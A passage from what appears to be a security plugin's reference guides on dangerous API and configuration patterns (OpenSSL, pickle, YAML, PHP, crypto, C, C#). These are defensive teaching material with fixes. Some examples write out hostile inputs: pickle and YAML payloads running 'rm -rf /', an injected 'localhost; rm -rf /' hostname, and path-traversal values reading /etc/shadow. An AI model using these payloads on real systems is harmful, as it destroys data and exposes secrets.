secret_key;\nmpz_init(secret_key);\n// ... use secret_key ...\nmpz_clear(secret_key);  // Memory NOT securely wiped\n// Secret data may persist in freed memory\n```\n\n**The Problem**: `mpz_clear` doesn't zero memory before freeing. Secrets persist.\n\n### Sharp Edge: Confusing Import/Export API\n\n```c\n// What does this do?\nmpz_export(buf, &count, order, size, endian, nails, op);\n\n// Parameters:\n// - order: 1 = most significant word first, -1 = least significant\n// - endian: 1 = big, -1 = little, 0 = native\n// - nails: bits to skip at top of each word (?!)\n```\n\n**The Problem**: Seven parameters, three of which control byte ordering in different ways. Easy to get wrong, hard to verify correctness.\n\n### Mitigation\n\nFor cryptographic use, prefer:\n- **libsodium** for common operations\n- **OpenSSL BIGNUM** (has constant-time variants)\n- **libgmp with mpz_powm_sec** (partial mitigation, not complete)\n\n---\n\n## OpenSSL\n\nThe canonical example of a powerful but footgun-laden cryptographic library.\n\n### Sharp Edge: SSL_CTX_set_verify Callback\n\n```c\n// DANGEROUS: Easy to write callback that always returns 1\nSSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_callback);\n\nint verify_callback(int preverify_ok, X509_STORE_CTX *ctx) {\n    // Developer thinks: \"I'll add logging here\"\n    log_certificate(ctx);\n    return 1;  // OOPS: Always accepts, ignoring preverify_ok!\n}\n```\n\n**The Problem**: The callback's return value determines whether verification succeeds. Developers often:\n- Return 1 (success) unconditionally while \"just adding logging\"\n- Forget that returning non-zero bypasses all verification\n- Copy-paste examples that return 1 for \"debugging\"\n\n**Correct Pattern**:\n```c\nint verify_callback(int preverify_ok, X509_STORE_CTX *ctx) {\n    if (!preverify_ok) {\n        // Log failure details\n        log_verification_failure(ctx);\n    }\n    return preverify_ok;  // Preserve original decision\n}\n```\n\n### Sharp Edge: Error Handling via ERR_get_error\n\n```c\n// DANGEROUS: Error easily ignored\nEVP_EncryptFinal_ex(ctx, outbuf, &outlen);\n// Did it succeed? Who knows!\n\n// Correct but verbose:\nif (EVP_EncryptFinal_ex(ctx, outbuf, &outlen) != 1) {\n    unsigned long err = ERR_get_error();\n    char buf[256];\n    ERR_error_string_n(err, buf, sizeof(buf));\n    // Handle error...\n}\n```\n\n**The Problem**:\n- Functions return 1 for success (not 0!)\n- Errors accumulate in a thread-local queue\n- Easy to forget to check, easy to check wrong way\n- Error queue must be cleared or errors persist\n\n### Sharp Edge: RAND_bytes vs RAND_pseudo_bytes\n\n```c\n// These look almost identical:\nRAND_bytes(buf, len);        // Cryptographically secure\nRAND_pseudo_bytes(buf, len); // NOT guaranteed secure!\n\n// Worse: RAND_pseudo_bytes returns 1 even when insecure\nint rc = RAND_pseudo_bytes(buf, len);\n// rc == 1 means \"success\", not \"cryptographically random\"\n// rc == 0 means \"success but not crypto-strength\" (!!)\n// rc == -1 means \"not supported\"\n```\n\n**The Problem**: Function names differ by one word; return values are confusing; the insecure function is not clearly marked dangerous.\n\n### Sharp Edge: Memory Ownership Confusion\n\n```c\n// Who frees this?\nX509 *cert = SSL_get_peer_certificate(ssl);\n// Answer: YOU do (it's a copy)\n\n// Who frees this?\nX509 *cert = SSL_get0_peer_certificate(ssl);  // OpenSSL 3.0+\n// Answer: NOBODY (it's a reference)\n\n// The difference: \"get\" vs \"get0\"\n// This convention is NOT obvious or consistently applied\n```\n\n**The Problem**: Memory ownership indicated by subtle naming conventions that aren't documented together and aren't consistent across the API.\n\n### Sharp Edge: EVP_CIPHER_CTX Reuse\n\n```c\nEVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();\nEVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv);\nEVP_EncryptUpdate(ctx, out, &outlen, in, inlen);\nEVP_EncryptFinal_ex(ctx, out + outlen, &tmplen);\n\n// DANGEROUS: Reusing ctx without reset\nEVP_EncryptInit_ex(ctx, NULL, NULL, NULL, iv2);  // New IV only\n// Some state from previous encryption may persist!\n```\n\n**The Problem**: Context reuse rules are complex and vary by cipher mode.\n\n---\n\n## Python's `pickle`\n\n### Sharp Edge: Arbitrary Code Execution by Design\n\n```python\nimport pickle\n\n# DANGEROUS: Deserializes arbitrary Python objects\ndata = pickle.loads(untrusted_input)\n\n# Attacker sends:\n# b\"cos\\nsystem\\n(S'rm -rf /'\\ntR.\"\n# Result: Executes shell command\n```\n\n**The Problem**: `pickle` is not a data formatit's a code execution format. There is no safe way to unpickle untrusted data, but:\n- The function looks like a data parser\n- The name suggests food preservation, not danger\n- Many developers don't realize the risk\n\n**Mitigation**: Use `json` for data. If you need pickle, use `hmac` to authenticate before unpickling (but even then, prefer safer formats).\n\n---\n\n## YAML Libraries\n\n### Sharp Edge: Code Execution via Tags\n\n```python\nimport yaml\n\n# DANGEROUS: yaml.load() executes arbitrary code\ndata = yaml.load(untrusted_input)\n\n# Attacker sends:\n# !!python/object/apply:os.system ['rm -rf /']\n```\n\n**The Problem**: YAML's tag system allows arbitrary object instantiation. The \"safe\" loader is:\n```python\ndata = yaml.safe_load(untrusted_input)  # Safe\ndata = yaml.load(untrusted_input, Loader=yaml.SafeLoader)  # Also safe\n```\n\nBut the dangerous version is the obvious one (`yaml.load()`).\n\n---\n\n## PHP's `strcmp` for Password Comparison\n\n### Sharp Edge: Type Juggling Bypass\n\n```php\n// DANGEROUS: Type juggling attack\nif (strcmp($_POST['password'], $stored_password) == 0) {\n    authenticate();\n}\n\n// Attacker sends: password[]=anything\n// strcmp(array, string) returns NULL\n// NULL == 0 is TRUE in PHP!\n```\n\n**The Problem**:\n- `strcmp` returns `NULL` on type error, not `-1` or `1`\n- PHP's `==` operator coerces `NULL` to `0`\n- `NULL == 0` evaluates to `TRUE`\n- Authentication bypassed\n\n**Fix**:\n```php\nif (hash_equals($stored_hash, hash('sha256', $_POST['password']))) {\n    // Use hash_equals for timing-safe comparison\n    // AND proper password hashing (not shown)\n}\n```\n\n---\n\n## Analysis Template\n\nWhen examining a library for sharp edges:\n\n### Input  Expected Output\n\n| Input | Expected | Actual | Vulnerability |\n|-------|----------|--------|---------------|\n| `verify_ssl=false` | Clear warning | Silent acceptance | Config cliff |\n| `password=\"\"` | Rejection | Login success | Empty bypass |\n| `algorithm=\"none\"` | Error | Signature skipped | Downgrade |\n| `timeout=-1` | Error | Infinite timeout | Magic value |\n\n### Library Comparison\n\n| Feature | Dangerous Library | Safer Alternative |\n|---------|------------------|-------------------|\n| Bignum crypto | GMP | libsodium, OpenSSL BIGNUM |\n| TLS | Raw OpenSSL | Higher-level wrappers |\n| Serialization | pickle, YAML | JSON, protobuf |\n| Password compare | strcmp | hash_equals, secrets.compare_digest |\n",
        "plugins/sharp-edges/skills/sharp-edges/references/config-patterns.md": "# Configuration Security Patterns\n\nDangerous configuration patterns that enable security failures.\n\n## Zero/Empty/Null Semantics\n\n### The Lifetime Zero Problem\n\n```yaml\n# What does 0 mean?\nsession_timeout: 0    # Infinite timeout? Immediate expiry? Disabled?\ntoken_lifetime: 0     # Never expires? Already expired? Use default?\nmax_attempts: 0       # No attempts allowed? Unlimited attempts?\n```\n\n**Real-world failures:**\n- OTP libraries where `lifetime=0` means \"accept any OTP regardless of age\"\n- Rate limiters where `max_attempts=0` disables rate limiting\n- Session managers where `timeout=0` means \"session never expires\"\n\n**Detection**: Any numeric security parameter that accepts 0.\n\n**Fix**: Explicit constants, validation, or separate enable/disable flag.\n\n```python\n# BAD\ndef verify_otp(code: str, lifetime: int = 300):\n    if lifetime <= 0:\n        return True  # What??\n\n# GOOD\ndef verify_otp(code: str, lifetime: int = 300):\n    if lifetime <= 0:\n        raise ValueError(\"lifetime must be positive\")\n```\n\n### Empty String Bypass\n\n```python\n# Passwords\nif user_password == stored_hash:  # What if stored_hash is \"\"?\n\n# API keys\nif api_key == config.api_key:  # What if config is empty?\n    grant_access()\n\n# The empty string equals the empty string\n\"\" == \"\"  # True - authentication bypassed\n```\n\n**Detection**: String comparisons for authentication without empty checks.\n\n### Null as \"Skip\"\n\n```javascript\n// DANGEROUS: null means \"skip verification\"\nfunction verifySignature(data, signature, publicKey) {\n    if (!publicKey) return true;  // No key = trust everything?\n    return crypto.verify(data, signature, publicKey);\n}\n\n// DANGEROUS: null means \"any value\"\nfunction checkRole(user, requiredRole) {\n    if (!requiredRole) return true;  // No requirement = allow all?\n    return user.roles.includes(requiredRole);\n}\n```\n\n## Boolean Traps\n\n### Security-Disabling Flags\n\n```yaml\n# Every one of these has caused real vulnerabilities\nverify_ssl: false\nvalidate_certificate: false\ncheck_signature: false\nrequire_auth: false\nenable_csrf_protection: false\nsanitize_input: false\n```\n\n**Pattern**: Any boolean that disables a security control.\n\n**The typo problem:**\n```yaml\nverify_ssl: fasle   # Typo - what does the parser do?\nverify_ssl: \"false\" # String \"false\" - truthy in many languages!\nverify_ssl: 0       # Integer 0 - falsy, but is it valid?\n```\n\n### Double Negatives\n\n```yaml\n# Confusing\ndisable_auth: false      # Auth enabled? Let me re-read...\nskip_validation: false   # Validation runs? Think carefully...\n\n# Clear\nauth_enabled: true\nvalidate_input: true\n```\n\n## Magic Values\n\n### Sentinel Values in Security Parameters\n\n```yaml\n# What do these mean?\nmax_retries: -1      # Infinite? Error? Use default?\ncache_ttl: -1        # Never expire? Disabled?\ntimeout_seconds: -1  # Wait forever? Use system default?\n\n# Real vulnerability: connection pool with max_connections: -1\n# meant \"unlimited\" - enabled DoS via connection exhaustion\n```\n\n### Special String Values\n\n```yaml\n# Dangerous patterns\nallowed_origins: \"*\"       # CORS wildcard\nallowed_hosts: \"any\"       # Bypass host validation\nlog_level: \"none\"          # Disable security logging\npassword_policy: \"disabled\" # No password requirements\n```\n\n**Detection**: String configs that accept wildcards or \"disable\" keywords.\n\n## Combination Hazards\n\n### Conflicting Settings\n\n```yaml\n# Both true - which wins?\nrequire_authentication: true\nallow_anonymous_access: true\n\n# Both specified - conflict\nsession_cookie_secure: true\nforce_http: true  # HTTP can't use Secure cookies\n\n# Mutually exclusive\nencryption_key: \"...\"\nencryption_disabled: true\n```\n\n### Precedence Confusion\n\n```yaml\n# In config file\nverify_ssl: true\n\n# But overrideable by environment?\nVERIFY_SSL=false  # Which wins?\n\n# And command line?\n--no-verify-ssl   # Now there are three sources\n```\n\n**Fix**: Document precedence clearly; warn on conflicts; fail on contradictions.\n\n## Environment Variable Hazards\n\n### Sensitive Values in Environment\n\n```bash\n# Common but problematic\nexport DATABASE_PASSWORD=\"secret\"\nexport API_KEY=\"sk_live_xxx\"\n\n# Risks:\n# - Visible in process listings (ps aux)\n# - Inherited by child processes\n# - Logged in error dumps\n# - Visible in container inspection\n```\n\n### Override Attacks\n\n```python\n# Application trusts environment\ndebug = os.environ.get(\"DEBUG\", \"false\") == \"true\"\n\n# Attacker with environment access:\nexport DEBUG=true  # Enables verbose logging of secrets\n```\n\n**Detection**: Security settings controllable via environment without validation.\n\n## Path Traversal via Config\n\n### Unrestricted Path Configuration\n\n```yaml\n# User-controlled paths\nlog_file: \"../../../etc/passwd\"\nupload_dir: \"/etc/nginx/conf.d/\"\ntemplate_dir: \"../../../etc/shadow\"\n\n# Even \"read-only\" paths can leak secrets\nconfig_include: \"/etc/shadow\"\ncertificate_file: \"/proc/self/environ\"\n```\n\n**Fix**: Validate paths; restrict to allowed directories; resolve and check.\n\n## Unvalidated Constructor Parameters\n\nConfiguration/parameter classes that accept security-relevant values without validation create \"time bombs\" - the insecure value is accepted silently at construction, then explodes later during use.\n\n### Algorithm Selection Without Allowlist\n\n```php\n// DANGEROUS: Accepts any string including weak algorithms\nreadonly class ServerConfig {\n    public function __construct(\n        public string $hashAlgo = 'sha256',  // Accepts 'md5', 'crc32', 'adler32'\n        public string $cipher = 'aes-256-gcm', // Accepts 'des', 'rc4'\n    ) {}\n}\n\n// Caller can pass insecure values:\nnew ServerConfig(hashAlgo: 'md5');  // Silently accepted!\n```\n\n**Detection**: Constructor parameters named `algo`, `algorithm`, `hash*`, `cipher`, `mode`, `*_type` that accept strings without validation.\n\n**Fix**: Validate against an explicit allowlist at construction:\n\n```php\npublic function __construct(public string $hashAlgo = 'sha256') {\n    if (!in_array($hashAlgo, ['sha256', 'sha384', 'sha512'], true)) {\n        throw new InvalidArgumentException(\"Disallowed hash algorithm: $hashAlgo\");\n    }\n}\n```\n\n### Timing Parameters Without Bounds\n\n```php\n// DANGEROUS: No minimum or maximum bounds\nreadonly class AuthConfig {\n    public function __construct(\n        public int $otpLifetime = 120,     // Accepts 0 (immediate expiry? infinite?)\n        public int $sessionTimeout = 3600, // Accepts -1 (what does this mean?)\n        public int $maxRetries = 5,        // Accepts 0 (no retries? unlimited?)\n    ) {}\n}\n\n// All of these are silently accepted:\nnew AuthConfig(otpLifetime: 0);      // OTP always expired or never expires?\nnew AuthConfig(otpLifetime: 999999); // ~11 days - replay attacks!\nnew AuthConfig(maxRetries: -1);      // Unlimited retries = brute force\n```\n\n**Detection**: Numeric constructor parameters for `*lifetime`, `*timeout`, `*ttl`, `*duration`, `max_*`, `min_*`, `*_seconds`, `*_attempts` without range validation.\n\n**Fix**: Enforce both minimum AND maximum bounds:\n\n```php\npublic function __construct(public int $otpLifetime = 120) {\n    if ($otpLifetime < 2) {\n        throw new InvalidArgumentException(\"OTP lifetime too short (min: 2 seconds)\");\n    }\n    if ($otpLifetime > 300) {\n        throw new InvalidArgumentException(\"OTP lifetime too long (max: 300 seconds)\");\n    }\n}\n```\n\n### Hostname/URL Parameters Without Validation\n\n```php\n// DANGEROUS: No format validation\nreadonly class NetworkConfig {\n    public function __construct(\n        public string $hostname = 'localhost',  // Accepts anything\n        public string $callbackUrl = '',        // Accepts malformed URLs\n    ) {}\n}\n\n// Silently accepted:\nnew NetworkConfig(hostname: '../../../etc/passwd');\nnew NetworkConfig(hostname: 'localhost; rm -rf /');\nnew NetworkConfig(callbackUrl: 'javascript:alert(1)');\n```\n\n**Detection**: String constructor parameters named `host`, `hostname`, `domain`, `*_url`, `*_uri`, `endpoint`, `callback*` without validation.\n\n**Fix**: Validate format at construction:\n\n```php\npublic function __construct(public string $hostname = 'localhost') {\n    if (!filter_var($hostname, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {\n        throw new InvalidArgumentException(\"Invalid hostname: $hostname\");\n    }\n}\n```\n\n### The \"Sensible Default\" Trap\n\nHaving a secure default does NOT protect you - callers can override it:\n\n```php\n// Default is secure...\npublic function __construct(\n    public string $hashAlgo = 'sha256'  // Good default!\n) {}\n\n// ...but callers can still shoot themselves\n$config = new Config(hashAlgo: 'md5');  // Oops\n```\n\n**The rule**: If a parameter affects security, validate it. Defaults only help developers who don't specify a value; validation protects everyone.\n\n## Configuration Validation Checklist\n\nFor configuration schemas, verify:\n\n- [ ] **Zero/empty rejected**: Numeric security params require positive values\n- [ ] **No empty passwords/keys**: Empty string authentication forbidden\n- [ ] **No security-disabling booleans**: Or require confirmation/separate config\n- [ ] **No magic values**: -1 and wildcards have defined, safe meanings\n- [ ] **Conflict detection**: Contradictory settings produce errors\n- [ ] **Precedence documented**: Clear order when multiple sources exist\n- [ ] **Path validation**: User-provided paths restricted to safe directories\n- [ ] **Type strictness**: \"false\" string not silently converted to boolean\n- [ ] **Deprecation warnings**: Insecure legacy options warn loudly\n- [ ] **Algorithm allowlist**: Crypto algorithm params validated against safe options\n- [ ] **Timing bounds**: Lifetime/timeout params have both min AND max limits\n- [ ] **Hostname/URL validation**: Network addresses validated at construction\n- [ ] **Constructor validation**: All security params validated, not just defaulted\n",
        "plugins/sharp-edges/skills/sharp-edges/references/crypto-apis.md": "# Cryptographic API Footguns\n\nDetailed patterns for identifying misuse-prone cryptographic interfaces.\n\n## Algorithm Selection Anti-Patterns\n\n### The \"alg\" Header Attack (JWT)\n\nThe JSON Web Token standard allows the token itself to specify which algorithm to use for verification. This is catastrophically wrong.\n\n**Attack 1: \"none\" algorithm**\n```json\n{\"alg\": \"none\", \"typ\": \"JWT\"}\n```\nMany libraries accept this and skip signature verification entirely.\n\n**Attack 2: Algorithm confusion (RS256  HS256)**\n- Server expects RSA signature, uses public key for verification\n- Attacker changes algorithm to HMAC, uses *public key* as HMAC secret\n- Public key is public, so attacker can forge valid signatures\n\n**Root cause**: Trusting untrusted input to select security mechanisms.\n\n**Fix**: Never let data dictate algorithm. Use one algorithm, hardcoded.\n\n### Cipher Mode Parameters\n\n```python\n# DANGEROUS: mode is selectable\ndef encrypt(plaintext, key, mode=\"ECB\"):  # ECB is never correct\n    ...\n\n# BAD: accepts any OpenSSL cipher string\ncipher = OpenSSL::Cipher.new(user_selected_cipher)\n\n# GOOD: no parameters\ndef encrypt(plaintext, key):  # internally uses AES-256-GCM\n    ...\n```\n\n**Detection**: Parameters named `mode`, `cipher`, `algorithm`, `hash_type`\n\n### Hash Algorithm Downgrade\n\n```php\n// PHP's hash() accepts ANY algorithm\nhash(\"crc32\", $password);  // Valid call, terrible security\nhash(\"md5\", $password);    // Valid call, broken security\nhash(\"sha256\", $password); // Valid call, still wrong for passwords\n\n// Password functions limit choices\npassword_hash($password, PASSWORD_ARGON2ID);  // Better\n```\n\n**Pattern**: APIs that accept algorithm as string instead of restricting to safe subset.\n\n## Key/Nonce/IV Confusion\n\n### Indistinguishable Byte Arrays\n\n```go\n// All three are just []byte - easy to swap\nfunc Encrypt(plaintext, key, nonce []byte) []byte\n\n// Easy mistakes:\nEncrypt(plaintext, nonce, key)  // Swapped - compiles fine\nEncrypt(plaintext, key, key)    // Reused key as nonce - compiles fine\n```\n\n**Fix**: Distinct types\n\n```go\ntype EncryptionKey [32]byte\ntype Nonce [24]byte\n\nfunc Encrypt(plaintext []byte, key EncryptionKey, nonce Nonce) []byte\n// Now type system catches swaps\n```\n\n### Nonce Reuse\n\n```python\n# DANGEROUS: nonce parameter with no guidance\ndef encrypt(plaintext, key, nonce):\n    ...\n\n# Developer \"simplifies\" by reusing:\nnonce = b'\\x00' * 12\nencrypt(msg1, key, nonce)\nencrypt(msg2, key, nonce)  # Catastrophic with GCM/ChaCha\n```\n\n**Fix**: Generate nonces internally, return them with ciphertext.\n\n## Comparison Footguns\n\n### Timing-Safe vs. Regular Comparison\n\n```python\n# These look identical but have different security properties\nif computed_mac == expected_mac:  # VULNERABLE: timing attack\nif hmac.compare_digest(computed_mac, expected_mac):  # Safe\n```\n\n**The problem**: Developers don't know to use special comparison. Default string equality is vulnerable.\n\n**Detection**: Direct equality checks on MACs, signatures, hashes, tokens.\n\n### Boolean Confusion\n\n```python\n# Signature verification APIs\nresult = verify(signature, message, key)\n\n# Some return True/False\nif verify(...):  # Must check return value\n\n# Some raise exceptions\nverify(...)  # Failure = exception, no return to check\n\n# Developers mixing these up = vulnerabilities\n```\n\n## Padding Oracle Enablers\n\n### Raw Decryption APIs\n\n```python\n# DANGEROUS: returns plaintext even if padding invalid\ndef decrypt(ciphertext, key):\n    # ... decrypt ...\n    return unpad(plaintext)  # Throws on bad padding\n\n# Attacker can distinguish:\n# - Valid padding  success\n# - Invalid padding  exception\n\n# This distinction enables padding oracle attacks\n```\n\n**Fix**: Decrypt-then-MAC (or authenticated encryption). Never expose padding validity.\n\n### Error Message Differentiation\n\n```\n# DANGEROUS error messages\n\"Invalid padding\"           # Padding oracle signal\n\"MAC verification failed\"   # Different error = oracle\n\"Decryption failed\"         # Good: single error for all failures\n```\n\n## Key Derivation Footguns\n\n### Using Hashes Instead of KDFs\n\n```python\n# DANGEROUS: hash is not a KDF\nkey = hashlib.sha256(password.encode()).digest()\n\n# Developer reasoning: \"SHA-256 is secure\"\n# Reality: Fast hash enables brute force\n\n# CORRECT: use actual KDF\nkey = hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1)\n```\n\n### Password Storage Misuse\n\n```python\n# DANGEROUS: encryption is not password storage\nencrypted_password = encrypt(password, master_key)\n# Compromise of master_key = all passwords exposed\n\n# CORRECT: one-way hash with salt\nhashed_password = argon2.hash(password)\n# No key to steal; each password salted differently\n```\n\n## Safe API Design Checklist\n\nFor cryptographic APIs, verify:\n\n- [ ] **No algorithm selection**: One safe algorithm, hardcoded\n- [ ] **No mode selection**: GCM/ChaCha20-Poly1305 only, no ECB/CBC\n- [ ] **Distinct types**: Keys, nonces, ciphertexts are different types\n- [ ] **Internal nonce generation**: Don't require developer to provide\n- [ ] **Authenticated encryption**: Encrypt-then-MAC or AEAD built in\n- [ ] **Constant-time comparison**: Default or only comparison method\n- [ ] **Uniform errors**: Same error for all decryption failures\n- [ ] **KDF for passwords**: Argon2/scrypt/bcrypt, not raw hashes\n",
        "plugins/sharp-edges/skills/sharp-edges/references/lang-c.md": "# C/C++ Sharp Edges\n\n## Integer Overflow is Undefined Behavior\n\n```c\n// DANGEROUS: Signed overflow is UB, compiler can optimize away checks\nint x = INT_MAX;\nif (x + 1 > x) {  // Compiler may assume always true (UB)\n    // Overflow check optimized away!\n}\n\n// DANGEROUS: Size calculations\nsize_t size = user_count * sizeof(struct User);\n// If user_count * sizeof overflows, allocates tiny buffer\nvoid *buf = malloc(size);\n```\n\n**The Problem**: Signed integer overflow is undefined behavior. Compilers assume it never happens and optimize accordinglyincluding removing overflow checks.\n\n**Detection**: Look for arithmetic on signed integers, especially in size calculations, loop bounds, and allocation sizes.\n\n## Buffer Handling\n\n```c\n// DANGEROUS: No bounds checking\nchar buf[64];\nstrcpy(buf, user_input);       // Classic overflow\nsprintf(buf, \"Hello %s\", name); // Format + overflow\ngets(buf);                      // Never use, removed in C11\n\n// DANGEROUS: Off-by-one\nchar buf[64];\nstrncpy(buf, src, 64);         // NOT null-terminated if src >= 64!\nbuf[63] = '\\0';                // Must do manually\n\n// DANGEROUS: snprintf return value\nint ret = snprintf(buf, sizeof(buf), \"%s\", long_string);\n// ret is length that WOULD be written, not actual length\n// If ret >= sizeof(buf), output was truncated\n```\n\n**Safe Alternatives**:\n- `strlcpy`, `strlcat` (BSD, not standard)\n- `snprintf` with proper return value checking\n- C11 Annex K `strcpy_s`, `sprintf_s` (limited support)\n\n## Format Strings\n\n```c\n// DANGEROUS: User controls format\nprintf(user_input);            // Format string attack\nsyslog(LOG_INFO, user_input);  // Same problem\nfprintf(stderr, user_input);   // Same problem\n\n// Attacker input: \"%x%x%x%x\"  leaks stack\n// Attacker input: \"%n\"  writes to memory\n\n// SAFE: Format as literal\nprintf(\"%s\", user_input);\n```\n\n**Detection**: Any `*printf` family function where the format argument is not a string literal.\n\n## Memory Cleanup\n\n```c\n// DANGEROUS: Compiler may optimize away\nchar password[64];\n// ... use password ...\nmemset(password, 0, sizeof(password));  // May be removed!\n\n// The compiler sees: \"writes to password, then password goes out of scope\"\n// Optimization: \"dead store elimination\" removes the memset\n```\n\n**Safe Alternatives**:\n```c\n// Option 1: explicit_bzero (BSD, glibc 2.25+)\nexplicit_bzero(password, sizeof(password));\n\n// Option 2: SecureZeroMemory (Windows)\nSecureZeroMemory(password, sizeof(password));\n\n// Option 3: Volatile function pointer trick\nstatic void *(*const volatile memset_ptr)(void *, int, size_t) = memset;\nmemset_ptr(password, 0, sizeof(password));\n\n// Option 4: C11 memset_s (limited support)\nmemset_s(password, sizeof(password), 0, sizeof(password));\n```\n\n## Uninitialized Variables\n\n```c\n// DANGEROUS: Uninitialized stack variables\nint result;\nif (condition) {\n    result = compute();\n}\nreturn result;  // Uninitialized if !condition\n\n// DANGEROUS: Uninitialized struct padding\nstruct {\n    char a;      // 1 byte\n    // 3 bytes padding (uninitialized)\n    int b;       // 4 bytes\n} s;\ns.a = 'x';\ns.b = 42;\nsend(sock, &s, sizeof(s), 0);  // Leaks 3 bytes of stack\n```\n\n**Fix**: Use `= {0}` initialization or `memset`.\n\n## Double Free and Use-After-Free\n\n```c\n// DANGEROUS: Double free\nfree(ptr);\n// ... later ...\nfree(ptr);  // Heap corruption\n\n// DANGEROUS: Use after free\nfree(ptr);\nptr->value = 42;  // Writing to freed memory\n\n// DANGEROUS: Returning pointer to local\nchar *get_greeting() {\n    char buf[64] = \"hello\";\n    return buf;  // Stack pointer invalid after return\n}\n```\n\n**Mitigations**:\n- Set pointer to NULL after free: `free(ptr); ptr = NULL;`\n- Use static analysis (Coverity, cppcheck)\n- Use AddressSanitizer in testing\n\n## Signal Handler Issues\n\n```c\n// DANGEROUS: Non-async-signal-safe functions in handler\nvoid handler(int sig) {\n    printf(\"Got signal\\n\");  // NOT async-signal-safe\n    malloc(100);             // NOT async-signal-safe\n    free(ptr);               // NOT async-signal-safe\n}\n\n// Async-signal-safe: write(), _exit(), signal()\n// Most functions including printf, malloc, free are NOT safe\n```\n\n## Time-of-Check to Time-of-Use (TOCTOU)\n\n```c\n// DANGEROUS: File state can change between check and use\nif (access(filename, W_OK) == 0) {\n    // Attacker replaces file with symlink here\n    fd = open(filename, O_WRONLY);  // Opens different file\n}\n```\n\n**Fix**: Open first, then check permissions on the file descriptor.\n\n## Variadic Function Pitfalls\n\n```c\n// DANGEROUS: Wrong format specifier\nprintf(\"%d\", (long long)value);  // %d expects int, not long long\nprintf(\"%s\", 42);                // Interprets 42 as pointer\n\n// DANGEROUS: Missing sentinel\nexecl(\"/bin/ls\", \"ls\", \"-l\", NULL);  // NULL required!\nexecl(\"/bin/ls\", \"ls\", \"-l\");        // Missing NULL = UB\n```\n\n## Macro Pitfalls\n\n```c\n// DANGEROUS: Macro arguments evaluated multiple times\n#define SQUARE(x) ((x) * (x))\nint a = 5;\nSQUARE(a++);  // Expands to ((a++) * (a++)) - increments twice!\n\n// DANGEROUS: Operator precedence\n#define ADD(a, b) a + b\nint x = ADD(1, 2) * 3;  // Expands to 1 + 2 * 3 = 7, not 9\n\n// SAFER: Fully parenthesize\n#define ADD(a, b) ((a) + (b))\n```\n\n## Detection Patterns\n\nSearch for these patterns in C/C++ code:\n\n| Pattern | Risk |\n|---------|------|\n| `strcpy`, `strcat`, `gets`, `sprintf` | Buffer overflow |\n| `printf(var)` where var is not literal | Format string |\n| `memset` before variable goes out of scope | Dead store elimination |\n| `free(ptr)` without `ptr = NULL` | Double free risk |\n| `malloc` without overflow check on size | Integer overflow |\n| Arithmetic on `int` near INT_MAX | Signed overflow UB |\n| `strncpy` without explicit null termination | Missing terminator |\n",
        "plugins/sharp-edges/skills/sharp-edges/references/lang-csharp.md": "# C# Sharp Edges\n\n## Nullable Reference Types\n\n```csharp\n// DANGEROUS: NRT is opt-in and warnings-only by default\n// Project must enable: <Nullable>enable</Nullable>\n\nstring? nullable = null;\nstring nonNull = nullable;  // Warning, but compiles!\nnonNull.Length;  // NullReferenceException at runtime\n\n// DANGEROUS: Suppression operator\nstring value = possiblyNull!;  // Suppresses warning, doesn't fix bug\n\n// DANGEROUS: Default enabled doesn't mean enforced\n// Many legacy codebases have NRT enabled with thousands of warnings ignored\n```\n\n**Fix**: Enable NRT AND treat warnings as errors:\n```xml\n<Nullable>enable</Nullable>\n<TreatWarningsAsErrors>true</TreatWarningsAsErrors>\n```\n\n## Default Struct Values\n\n```csharp\n// DANGEROUS: Structs have default(T) that may be invalid\nstruct Connection {\n    public string Host;  // Default: null\n    public int Port;     // Default: 0\n}\n\nvar conn = default(Connection);\n// conn.Host is null, conn.Port is 0 - probably invalid state\n\n// DANGEROUS: Array of structs\nvar connections = new Connection[10];\n// All 10 are default(Connection) - invalid state\n```\n\n**Fix**: Use constructors, or make structs readonly with init validation.\n\n## IDisposable Leaks\n\n```csharp\n// DANGEROUS: Resources not disposed on exception\nvar conn = new SqlConnection(connectionString);\nconn.Open();\n// Exception here = connection never closed\nProcess(conn);\nconn.Dispose();\n\n// DANGEROUS: Nested disposables\nvar outer = new Outer();  // Creates inner disposable\n// Exception before outer.Dispose() = inner leaked\n```\n\n**Fix**: Use `using` statement or declaration:\n```csharp\nusing var conn = new SqlConnection(connectionString);\nconn.Open();\n// Disposed even on exception\n\nusing (var conn = new SqlConnection(...)) {\n    // Scoped disposal\n}\n```\n\n## Async/Await Pitfalls\n\n```csharp\n// DANGEROUS: async void - exceptions can't be caught\nasync void FireAndForget() {\n    throw new Exception(\"Lost!\");  // Crashes the process\n}\n\n// DANGEROUS: Deadlock with .Result\nasync Task DoWork() {\n    await Task.Delay(100);\n}\n\nvoid Caller() {\n    DoWork().Result;  // Deadlock in UI/ASP.NET contexts!\n}\n\n// DANGEROUS: Forgetting to await\nasync Task Process() {\n    DoWorkAsync();  // Not awaited - runs in background\n    // Exceptions lost, no completion guarantee\n}\n```\n\n**Fix**: Always return Task, use `ConfigureAwait(false)` in libraries:\n```csharp\nasync Task DoWorkAsync() {\n    await Task.Delay(100).ConfigureAwait(false);\n}\n```\n\n## LINQ Deferred Execution\n\n```csharp\n// DANGEROUS: LINQ queries are lazy\nvar query = items.Where(x => x.IsValid);\n// Nothing executed yet!\n\nitems.Add(newItem);  // Added after query defined\nforeach (var item in query) {\n    // newItem IS included - query executes here\n}\n\n// DANGEROUS: Multiple enumeration\nvar filtered = items.Where(x => ExpensiveCheck(x));\nvar count = filtered.Count();    // Executes query\nvar first = filtered.First();    // Executes query AGAIN\n```\n\n**Fix**: Materialize with `.ToList()` or `.ToArray()` when needed.\n\n## String Comparison\n\n```csharp\n// DANGEROUS: Culture-sensitive comparison by default\n\"stra\\u00dfe\".Equals(\"strasse\");  // Depends on culture!\n\n// DANGEROUS: Turkish-I problem\n\"INFO\".ToLower() == \"info\"  // FALSE in Turkish culture!\n// Turkish: I   (dotless i),   i\n\n// DANGEROUS: Ordinal vs linguistic\nstring.Compare(\"a\", \"A\");  // Culture-dependent\n```\n\n**Fix**: Use ordinal comparison for identifiers:\n```csharp\nstring.Equals(a, b, StringComparison.Ordinal);\nstring.Equals(a, b, StringComparison.OrdinalIgnoreCase);\n```\n\n## Boxing and Unboxing\n\n```csharp\n// DANGEROUS: Hidden boxing with value types\nint value = 42;\nobject boxed = value;  // Boxing allocation\nint unboxed = (int)boxed;  // 